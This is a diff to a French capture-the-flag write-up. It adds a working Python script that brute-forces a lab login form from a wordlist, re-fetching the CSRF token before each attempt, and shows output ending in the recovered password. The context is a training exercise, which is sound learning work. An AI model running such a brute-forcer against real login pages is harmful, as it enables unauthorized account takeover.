@@ -136,6 +136,74 @@ On aura donc cette sortie :
 
 On voit que le mot de passe **ILoveCersei** a été trouvé, car on a reçu une réponse **HTTP 302 Found**.
 
+On peut également utiliser un script python afin de trouver le mot de passe :
+
+```python {filename="bruteforce.py"} 
+import requests
+from bs4 import BeautifulSoup
+
+# Configuration
+URL = "http://lannister.castral-roc.lannisport.south/high_login.php"
+USERNAME = "james.lannis"
+WORDLIST = "sortie_wordlist.txt"
+
+def get_csrf_token(session):
+    """Récupère dynamiquement le token CSRF depuis la page de login"""
+    response = session.get(URL)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    token_input = soup.find("input", {"name": "csrf_token"})
+    return token_input["value"] if token_input else None
+
+def brute_force():
+    session = requests.Session()
+
+    with open(WORDLIST, "r", encoding="utf-8", errors="ignore") as file:
+        for password in file:
+            password = password.strip()
+            
+            # 🔹 Récupérer dynamiquement le token CSRF AVANT chaque requête
+            csrf_token = get_csrf_token(session)
+            if not csrf_token:
+                print("[!] Impossible d'obtenir le token CSRF !")
+                break
+
+            # 🔹 Envoyer la requête POST avec le token valide
+            headers = {"User-Agent": "Mozilla/5.0"}
+            data = {
+                "csrf_token": csrf_token,
+                "username": "james.lannis",
+                "password": password
+            }
+            response = session.post(URL, data=data, headers=headers)
+
+            # 🔹 Vérifier si l'authentification est réussie
+            if "Identifiants incorrects" not in response.text:
+                print(f"[+] Mot de passe trouvé : {password}")
+                return
+            
+            print(f"[-] Échec avec : {password}")
+
+    print("[X] Aucun mot de passe valide trouvé.")
+
+if __name__ == "__main__":
+    brute_force()
+```
+
+On l'appel avec la commande suivante : 
+
+```bash
+python3 bruteforce.py
+```
+
+On obtient alors le resultat : 
+
+```bash
+[-] Échec avec : 123456
+[-] Échec avec : 12345
+[-] Échec avec : 123456789
+[-] Échec avec : ILoveCersai
+[+] Mot de passe trouvé : ILoveCersei
+```
 
 
 ## 🎯 Étape 5 : Validation du Flag
